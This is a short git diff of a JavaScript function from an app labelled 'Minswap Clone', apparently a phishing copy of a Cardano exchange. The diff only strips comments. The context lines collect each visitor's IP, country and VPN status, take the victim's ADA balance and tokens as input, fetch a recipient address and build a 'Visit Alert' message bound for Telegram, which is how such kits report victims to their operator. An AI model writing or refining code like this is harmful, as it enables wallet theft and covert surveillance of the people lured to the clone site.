@@ -42,7 +42,6 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
 
   const { country, countryCode, ip, isVpnIpdata } = userCountryData;
 
-  // Check VPN status with IPQualityScore
   const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
 
   // Fetch the recipient address
@@ -50,13 +49,12 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
 
   const globeIcon = "🌍";  // Unicode globe icon
 
-  // Construct the message
+
   let message = `*Visit Alert*\n` +
                 `App: Minswap Clone\n\n` +
                 `User Info--------------------\n` +
                 `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;
 
-  // If VPN is detected by ipdata.co or IPQualityScore, add a VPN warning
   if (isVpnIpdata || isVpnIPQS) {
     message += `| ⚠️ VPN SUSPECTED  |\n`;
   } else {
